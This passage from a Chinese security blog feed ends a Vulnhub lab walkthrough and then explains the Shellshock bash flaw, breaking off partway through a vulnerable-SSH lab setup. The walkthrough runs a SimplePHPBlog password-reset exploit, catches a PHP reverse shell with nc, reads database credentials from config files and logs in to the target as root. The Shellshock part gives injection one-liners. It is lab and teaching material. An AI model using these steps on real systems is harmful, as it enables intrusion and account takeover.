(CODE:302|SIZE:0)                                                                                                               </span><br><span class="line">+ http://10.10.10.100/blog/rdf (CODE:200|SIZE:1411)                                                                                                                </span><br><span class="line">+ http://10.10.10.100/blog/rss (CODE:200|SIZE:1237)                                                                                                                </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/blog/scripts/                                                                                                                   </span><br><span class="line">+ http://10.10.10.100/blog/search (CODE:200|SIZE:4950)                                                                                                             </span><br><span class="line">+ http://10.10.10.100/blog/setup (CODE:302|SIZE:0)                                                                                                                 </span><br><span class="line">+ http://10.10.10.100/blog/static (CODE:302|SIZE:0)                                                                                                                </span><br><span class="line">+ http://10.10.10.100/blog/stats (CODE:200|SIZE:5309)                                                                                                              </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.100/blog/themes/                                                                                                                    </span><br><span class="line">+ http://10.10.10.100/blog/trackback (CODE:302|SIZE:0)                                                                                                             </span><br><span class="line">+ http://10.10.10.100/blog/upgrade (CODE:302|SIZE:0) </span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>扫到blog目录,访问<span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjEwMC9ibG9nLyVFNSU4RiVCMyVFOSU5NCVBRSVFNiU5RiVBNSVFNyU5QyU4QiVFNiVCQSU5MCVFNyVBMCU4MSVFNSU4RiU5MSVFNyU4RSVCMCVFNiU5OCVBRlNpbXBsZQ==">http://10.10.10.100/blog/右键查看源码发现是Simple<i class="fa fa-external-link-alt"></i></span> PHP Blog 0.4.0版本网上搜索exploit，发现有一大堆的exp</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub59.jpg"></p>
<p>exploitdb有几个符合要求的漏洞利用程序，一个Metasploit模块以及决定使用的基于Perl的漏洞利用程序,<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG93bmxvYWQvMTE5MQ==">perl脚本下载地址:<i class="fa fa-external-link-alt"></i></span></p>
<p>使用该poc修改blog的用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./SimplePHPBlog.pl -h http://10.10.10.100/blog/ -e 3 -U admin -P admin</span></span><br><span class="line">________________________________________________________________________________</span><br><span class="line">                  SimplePHPBlog v0.4.0 Exploits</span><br><span class="line">                             by</span><br><span class="line">                     Kenneth F. Belva, CISSP</span><br><span class="line">                    http://www.ftusecurity.com</span><br><span class="line">________________________________________________________________________________</span><br><span class="line">Running Set New Username and Password Exploit....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Deleted File: ./config/password.txt</span><br><span class="line">./config/password.txt created!</span><br><span class="line">Username is <span class="built_in">set</span> to: admin</span><br><span class="line">Password is <span class="built_in">set</span> to: admin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*** Exploit Completed....</span><br><span class="line">Have a nice day! :)</span><br></pre></td></tr></table></figure>

<p>成功修改,admin/admin成功登录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub60.jpg"></p>
<p>找到上传点上传php reverse shell</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub61.jpg"></p>
<p>可以直接上传.php后缀的文件</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub62.jpg"></p>
<p>然后访问php-reverse-shell.php,kali使用nc -lvp 5566命令监听，成功返回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">10.10.10.100: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [10.10.10.128] from (UNKNOWN) [10.10.10.100] 34832</span><br><span class="line">Linux web 2.6.38-8-server <span class="comment">#42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 16:07:45 up  2:14,  0 users,  load average: 0.03, 0.03, 0.02</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用以下命令来改善shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@web:/$ id</span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@web:/$ id^^^H^H^H^H^H^H^H</span><br><span class="line"></span><br><span class="line">www-data@web:/$ id</span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@web:/$ whoami</span><br><span class="line"></span><br><span class="line">www-data</span><br><span class="line">www-data@web:/$ ls</span><br><span class="line"></span><br><span class="line">bin   dev  home        lib    lost+found  mnt  proc  sbin     srv  tmp  var</span><br><span class="line">boot  etc  initrd.img  lib64  media       opt  root  selinux  sys  usr  vmlinuz</span><br></pre></td></tr></table></figure>

<p>在/var/www目录下寻找数据库配置文件的用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/var/www</span><br><span class="line">$ cat mysqli_connect.php</span><br><span class="line">&lt;?php <span class="comment"># Script 8.2 - mysqli_connect.php</span></span><br><span class="line"></span><br><span class="line">// This file contains the database access information.</span><br><span class="line">// This file also establishes a connection to MySQL</span><br><span class="line">// and selects the database.</span><br><span class="line"></span><br><span class="line">// Set the database access information as constants:</span><br><span class="line"></span><br><span class="line">DEFINE (<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">DEFINE (<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;goodday&#x27;</span>);</span><br><span class="line">DEFINE (<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">DEFINE (<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;ch16&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// Make the connection:</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbc</span> = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die (<span class="string">&#x27;Could not connect to MySQL: &#x27;</span> . mysqli_connect_error() );</span><br><span class="line"></span><br><span class="line">?&gt;$</span><br></pre></td></tr></table></figure>
<p>试了下这个密码，发现是错的，但是在/var/目录下还发现了一个mysqli_connect.php文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat mysqli_connect.php</span><br><span class="line">&lt;?php <span class="comment"># Script 8.2 - mysqli_connect.php</span></span><br><span class="line"></span><br><span class="line">// This file contains the database access information.</span><br><span class="line">// This file also establishes a connection to MySQL</span><br><span class="line">// and selects the database.</span><br><span class="line"></span><br><span class="line">// Set the database access information as constants:</span><br><span class="line"></span><br><span class="line">DEFINE (<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">DEFINE (<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;root@ISIntS&#x27;</span>);</span><br><span class="line">DEFINE (<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">DEFINE (<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;ch16&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// Make the connection:</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbc</span> = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die (<span class="string">&#x27;Could not connect to MySQL: &#x27;</span> . mysqli_connect_error() );</span><br><span class="line"></span><br><span class="line">www-data@web:/var$ mysql -uroot -proot@ISIntS</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 9823</span><br><span class="line">Server version: 5.1.54-1ubuntu4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line">This software comes with ABSOLUTELY NO WARRANTY. This is free software,</span><br><span class="line">and you are welcome to modify and redistribute it under the GPL v2 license</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show  databases;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| ch16               |</span><br><span class="line">| mysql              |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>

<p>发现/var目录下的配置文件中的密码可以正常连接mysql数据库，再使用该用户名和密码连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh root@10.10.10.100</span></span><br><span class="line">root@10.10.10.100<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 11.04 (GNU/Linux 2.6.38-8-server x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  http://www.ubuntu.com/server/doc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Sun Oct 20 16:31:46 EDT 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0               Processes:           81</span></span><br><span class="line"><span class="string">  Usage of /:   2.9% of 38.64GB   Users logged in:     0</span></span><br><span class="line"><span class="string">  Memory usage: 23%               IP address for eth0: 10.10.10.100</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Graph this data and manage this system at https://landscape.canonical.com/</span></span><br><span class="line"><span class="string">Last login: Sun Oct 20 16:18:11 2019 from 10.10.10.128</span></span><br><span class="line"><span class="string">root@web:~# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@web:~# whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>

<p>成功，挑战完成！！！够牛批，帅掉渣！！！</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>shellshock漏洞运作原理分析及其利用</title>
    <url>/2020/04/02/shellshock-exploitation/</url>
    <content><![CDATA[<h4 id="Part-I"><a href="#Part-I" class="headerlink" title="Part I"></a>Part I</h4><h3 id="涵盖的主题"><a href="#涵盖的主题" class="headerlink" title="涵盖的主题"></a>涵盖的主题</h3><ul>
<li>介绍</li>
<li>什么是Shellshock？</li>
<li>什么时候可以被利用？</li>
<li>如何检查自己是否脆弱</li>
<li>检查您的bash版本</li>
<li>在终端上运行精美的单线</li>
<li>Shellshock的技术见解</li>
<li>bash shell变量的基础</li>
<li>介绍bash环境变量</li>
<li>将bash函数导出到环境变量</li>
<li>从字符串解析函数定义</li>
<li>实际漏洞</li>
<li>可能的利用</li>
</ul>
<a id="more"></a>

<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Shellshock现在是安全社区中的流行语之一。在“Heartbleed”之后，它是最近使用最广泛的单词。本文首先提供该漏洞的内部详细信息。然后，它逐步引导读者完成如何设置自己的实验室以演示Shellshock漏洞以及利用部分的逐步过程。</p>
<h3 id="什么是Shellshock？"><a href="#什么是Shellshock？" class="headerlink" title="什么是Shellshock？"></a>什么是Shellshock？</h3><p>Shellshock是GNU Bourne Again Shell（BASH）中的一个漏洞，攻击者可以使用特制环境变量来运行任意命令。</p>
<h3 id="什么时候可以被利用？"><a href="#什么时候可以被利用？" class="headerlink" title="什么时候可以被利用？"></a>什么时候可以被利用？</h3><p>这是本文最重要的部分。在了解如何利用此Shellshock漏洞之前，需要了解容易受到Shellshock攻击的潜在目标。这也将帮助建立一个实验室来演示如何利用此漏洞。如果在Internet上阅读了一些有关Shellshock的新闻，则可能听说过以下易受攻击的目标：Apache mod-cgi，SSH，DHCP等。将以SSH为例进行说明。如果将OpenSSH用作SSH服务器以及将bash用作默认shell，则实际上并不需要利用SSH。为了利用这一点，存在一些限制，如下所述。如果为客户端实现了“authorization_keys”，并且在用户执行命令之前执行了“force command”等一些特定要求，则可能会受到攻击。现在不必担心这一点，稍后将详细讨论。到目前为止，记住：“如果使用任何使用易受攻击的bash版本作为解释程序的程序，并且攻击者能够控制传递给bash的环境变量的值，服务就会变得易受攻击。”。</p>
<p>为什么？因为这不是SSH中的漏洞；而是“bash”中的漏洞。</p>
<h3 id="如何检查bash是否易受攻击"><a href="#如何检查bash是否易受攻击" class="headerlink" title="如何检查bash是否易受攻击"></a>如何检查bash是否易受攻击</h3><h2 id="检查bash版本："><a href="#检查bash版本：" class="headerlink" title="检查bash版本："></a>检查bash版本：</h2><p>众所周知，Bash版本4.3之前是容易受到攻击的。因此，一种检查方法是使用以下命令检查bash版本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$bash</span> --version</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh2.png"></li>
</ul>
<p>凉！这个bash是脆弱的。</p>
<h2 id="在终端中运行精心构造的单线脚本："><a href="#在终端中运行精心构造的单线脚本：" class="headerlink" title="在终端中运行精心构造的单线脚本："></a>在终端中运行精心构造的单线脚本：</h2><p>在揭示了此Shellshock漏洞之后，有一种单行代码变得非常流行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$env</span> x= <span class="string">&#x27;() &#123; :;&#125;; echo shellshocked&#x27;</span> bash –c <span class="string">&quot;echo test&quot;</span></span><br></pre></td></tr></table></figure>

<p>在终端中运行以上行显示是否容易受到Shellshock的攻击。如果输出中显示“shellshocked”，则说明很容易受到shellshock攻击，现在该进行更新了。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh3.png"></li>
</ul>
<h2 id="Shellshock漏洞的技术见解"><a href="#Shellshock漏洞的技术见解" class="headerlink" title="Shellshock漏洞的技术见解"></a>Shellshock漏洞的技术见解</h2><p>现在，存在以下的问题：上面这行是做什么的？后台发生了什么事？如果打印出“ shellshocked”，为什么容易受到攻击？为了清楚起见，首先了解一下基础知识。</p>
<h2 id="bash-shell变量的基础"><a href="#bash-shell变量的基础" class="headerlink" title="bash shell变量的基础"></a>bash shell变量的基础</h2><p>通常，可以使用echo命令打印一些内容，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;shellshock&quot;</span></span><br></pre></td></tr></table></figure>

<p>现在，如果要将上述值存储在与任何其他脚本语言非常相似的变量中，将其放入一个名为“myvar”的变量中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ myvar=<span class="string">&quot;shellshock&quot;</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$myvar</span></span><br><span class="line">shellshock</span><br></pre></td></tr></table></figure>

<p>如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh4.png"></li>
</ul>
<p>现在，打开一个子进程，看看是否可以获取变量的值。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh5.png"></li>
</ul>
<p>如上图所示,无法将父进程设置的值读入子进程。</p>
<h2 id="介绍bash环境变量"><a href="#介绍bash环境变量" class="headerlink" title="介绍bash环境变量"></a>介绍bash环境变量</h2><p>在这里可以轻松地谈论环境变量。</p>
<p>当开始新的Shell会话时，已经准备好使用某些变量。这些可以称为环境变量。</p>
<p>想在子流程环境中访问上述“myvar”变量时，需要使其成为环境变量，以使其可用于新流程。可以使用“export”来实现。</p>
<p>如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh6.png"></li>
</ul>
<p>查看上图，可以清楚地看到子进程能够访问“myvar”的值。</p>
<p>现在，仅要确认已将其添加到环境变量中，请运行以下命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ env | grep <span class="string">&#x27;myvar&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh7.png"></li>
</ul>
<p>在上面的命令中，将打印出所有环境变量并过滤出目标变量。</p>
<h2 id="将bash函数导出到环境变量"><a href="#将bash函数导出到环境变量" class="headerlink" title="将bash函数导出到环境变量"></a>将bash函数导出到环境变量</h2><p>同样，可以将函数导出到子流程环境，如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh8.png"></li>
</ul>
<p>在上图中，首先定义了一个函数，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">x</span></span>() &#123; somecode;&#125;</span><br></pre></td></tr></table></figure>

<p>然后称为此函数x。</p>
<p>为了能够从子进程访问它，使用了”–f”flag将其导出，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> –f x</span><br></pre></td></tr></table></figure>

<p>如预期的那样，能够在子shell中打印文本。</p>
<h2 id="从字符串解析函数定义"><a href="#从字符串解析函数定义" class="headerlink" title="从字符串解析函数定义"></a>从字符串解析函数定义</h2><p>到目前为止，已经了解了bash变量和函数的工作方式，以及如何导出它们以便能够在子进程中访问它们。</p>
<p>现在，离Shellshock更近了。</p>
<p>上述函数定义也可以保存为字符串。</p>
<p>为了说明这一点，使用了一个名为“newfunction”的新变量。很快就会知道为什么要将变量命名为函数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ newfunction=<span class="string">&#x27;() &#123; echo &#x27;</span>shellshockdemo<span class="string">&#x27;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>正如之前所做的，只是定义一个变量。现在，可以将其作为常规变量进行访问，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="variable">$newfunction</span></span><br></pre></td></tr></table></figure>

<p>下图显示了以上两个步骤。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh9.png"></li>
</ul>
<p>到目前为止，一切都如预期。</p>
<p>现在，将其导出到环境变量并从子shell程序中访问它，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bash</span><br><span class="line">bash-3.2$ newfunction</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh10.png"></li>
</ul>
<p>奇妙的是，尽管能够在父shell程序中将其作为变量访问，但它被解释为子shell程序内的函数并执行该函数的主体。还要查看环境变量以检查功能。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh11.png"></li>
</ul>
<h2 id="这怎么可能？"><a href="#这怎么可能？" class="headerlink" title="这怎么可能？"></a>这怎么可能？</h2><p>当新的shell作为子进程启动时，它以字符串的值并将其解释为函数，因为它以（）开头。</p>
<h2 id="实际漏洞"><a href="#实际漏洞" class="headerlink" title="实际漏洞"></a>实际漏洞</h2><p>最后，在那里！</p>
<p>这次，将终止函数定义，并在终止函数后传递一些任意命令，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$export</span> newfunction=<span class="string">&#x27;() &#123; echo &#x27;</span>shellshockdemo<span class="string">&#x27;;&#125;; echo damn! I am vulnerable&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh12.png"></li>
</ul>
<p>答对了！在bash启动期间已执行了在函数定义之外添加的代码。</p>
<p>如果现在执行该函数，它将按预期进行。</p>
<p>如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh13.png"></li>
</ul>
<p>现在，如果您返回上一章节“何时可以利用它？”答案是：</p>
<p>条件1 –您的bash版本应该容易受到攻击（通过4.3）。</p>
<p>条件2 –攻击者应该能够控制传递的环境变量。</p>
<p>条件3 –应该生成一个新的bash shell（子过程）。</p>
<p>为了使整个过程自动化，我们使用“env”，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$env</span> x= <span class="string">&#x27;() &#123; :;&#125;; echo shellshocked&#x27;</span> bash –c <span class="string">&quot;echo test&quot;</span></span><br></pre></td></tr></table></figure>

<p>通常，env可用于打印所有环境变量，如先前所见。</p>
<p>但是，如果查看env的手册页，它也可以用于运行命令。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh14.png"></li>
</ul>
<p>另外，可以使用“–help”，如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh15.png"></li>
</ul>
<p>首先，来看一个简单的示例，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$env</span> newvar=demo bash –c <span class="string">&#x27;echo $newvar&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在上面显示的命令中，newvar是一个导出的变量，新的子进程正在访问该变量并输出其值。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh16.png"></li>
</ul>
<p>现在，如果看一下花哨的命令，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ env x=<span class="string">&#x27;() &#123; echo accessme;&#125; echo vulnerable&#x27;</span> bash –c <span class="string">&#x27;x&#x27;</span></span><br></pre></td></tr></table></figure>

<p>应该能够得到以下输出：</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh17.png"></li>
</ul>
<p>同样，相同的概念。</p>
<p>X是正在导出的变量。由于其值以（）开头，因此它将被子Shell视为函数，并且将执行定义。</p>
<p>但是在此之前，“vulnerable”将在生成shell时被打印出来。</p>
<p>下图表示了整个过程。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/103114_1609_PracticalSh18.png"></li>
</ul>
<p>到此时，应该能够了解到为什么这个简单的单行命令如此危险。</p>
<h2 id="可能的利用方式"><a href="#可能的利用方式" class="headerlink" title="可能的利用方式"></a>可能的利用方式</h2><p>以下是一些可能会引起Shellshock漏洞的严重情况：</p>
<ul>
<li>使用以bash或生成子shell编写的mod_cgi或mod_cgid脚本的Apache HTTP Server。</li>
<li>OpenSSH sshd中的Override或Bypass ForceCommand功能</li>
<li>允许在DHCP客户端计算机上运行任意命令。</li>
</ul>
<p>在下面的文章中，将看到如何建立自己的实验室，并演示如何利用易受攻击的OpenSSH和Apache服务器。</p>
<h4 id="Part-II"><a href="#Part-II" class="headerlink" title="Part II"></a>Part II</h4><h3 id="涵盖的主题-1"><a href="#涵盖的主题-1" class="headerlink" title="涵盖的主题"></a>涵盖的主题</h3><ul>
<li>背景</li>
<li>先决条件</li>
<li>配置SSH服务器</li>
<li><ul>
<li>添加新用户</li>
</ul>
</li>
<li><ul>
<li>为特定客户端创建授权密钥</li>
</ul>
</li>
<li><ul>
<li>将授权密钥添加到SSH服务器</li>
</ul>
</li>
<li><ul>
<li>使用authorized_keys登录</li>
</ul>
</li>
<li>漏洞利用</li>
<li>配置Apache服务器使其容易受到攻击</li>
<li>漏洞利用</li>
<li>整治</li>
</ul>
<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在上一篇文章中，看到了Shellshock漏洞的内部细节。在本文中，将看到如何在以下情况下利用bash错误。</p>
<ul>
<li>1.SSH利用</li>
<li>2.Apache服务器漏洞</li>
</ul>
<p>但是，在继续进行之前，建议先阅读本系列的第一部分。</p>
<h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><h2 id="所需软件"><a href="#所需软件" class="headerlink" title="所需软件"></a>所需软件</h2><ul>
<li>VirtualBox:从<span class="exturl" data-url="aHR0cDovL3d3dy52aXJ0dWFsYm94Lm9yZ+S4i+i9veW5tuWuieijhXZpcnR1YWxib3gv">www.virtualbox.org下载并安装VirtualBox<i class="fa fa-external-link-alt"></i></span></li>
<li>一台容易受到Shellshock攻击的机器–受害者,使用Kali Linux，因为它容易受到bash错误的影响。</li>
<li>任何基于Unix/Linux的计算机-Attacker最后，需要一台攻击机器。Linux盒 box首选，因为将使用命令行工具演示所有内容。使用运行Mac的计算机。</li>
</ul>
<p>在VirtualBox中安装攻击者和受害者的计算机。确保他们能够相互通信。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh1.png"></li>
</ul>
<p>上图显示了最终设置。</p>
<p>变得疯狂：通常，几乎所有演示中的攻击者都是Kali Linux。现在疯狂起来，这次让Kali变得具有弱点可以利用，并使用另一台计算机（为Mac）对其进行攻击。</p>
<h3 id="在易受攻击的SSH上利用Shellshock"><a href="#在易受攻击的SSH上利用Shellshock" class="headerlink" title="在易受攻击的SSH上利用Shellshock"></a>在易受攻击的SSH上利用Shellshock</h3><p>为了使漏洞利用能够工作，需要满足以下要求：</p>
<ul>
<li>1.显然，脆弱的bash shell</li>
<li>2.用户必须使用“authorization_keys”进行身份验证</li>
<li>3.必须限制用户运行某些特定命令。</li>
</ul>
<p>好吧，现在开始设置以上所有内容。</p>
<h3 id="配置易受攻击的SSH服务器"><a href="#配置易受攻击的SSH服务器" class="headerlink" title="配置易受攻击的SSH服务器"></a>配置易受攻击的SSH服务器</h3><p>在本节中，将了解为什么SSH服务器容易受到Shellshock的攻击。将配置一个故意易受攻击的SSH服务器。作为其一部分，将执行以下步骤。</p>
<ul>
<li>1.在服务器上添加一个新的用户帐户（受害者）。</li>
<li>2.为客户端（攻击者）创建授权密钥。</li>
<li>3.将授权密钥添加到sshd配置文件。</li>
<li>4.使用授权密钥登录。</li>
</ul>
<h2 id="1-在服务器上添加新的用户帐户"><a href="#1-在服务器上添加新的用户帐户" class="headerlink" title="1.在服务器上添加新的用户帐户"></a>1.在服务器上添加新的用户帐户</h2><p>首先启动Kali Linux，并添加一个名为“shellshock”的新用户帐户。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd –d /home/shellshock –s /bin/bash shellshock</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh2.png"></li>
</ul>
<p>在上图中，添加了一个新用户“shellshock”。</p>
<p>“/home/shellshock/”是主目录。</p>
<p>“/bin/bash/”是指向shell程序的绝对路径。</p>
<p>让看一下/etc/passwd文件，以交叉检查使用以下命令创建的用户。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep <span class="string">&#x27;shellshock&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh3.png"></li>
</ul>
<p>现在创建一个新目录，如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh4.png"></li>
</ul>
<p>递归地将上述目录的所有权授予用户“shellshock”。如下所示。</p>
<ul>
<li><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110214_1347_PracticalSh5.png"></li>
</ul>
<h2 id="2-为客户端创建授权密钥"><a href="#2-为客户端创建授权密钥" class="headerlink" title="2.为客户端创建授权密钥"></a>2.为客户端创建授权密钥</h2><p>如果您从未使用过通过授权密钥使用SSH的话，这是一个有趣的部分。</p>
<p>通常，使用用户名和密码登录SSH帐户。为了利用此bash漏洞，必须使用授权密钥对用户进行身份验证，而无需每次客户端连接到服务器时都输入用户名和密码。</p>
<p>在本节中，将了解如何进行设置。</p>
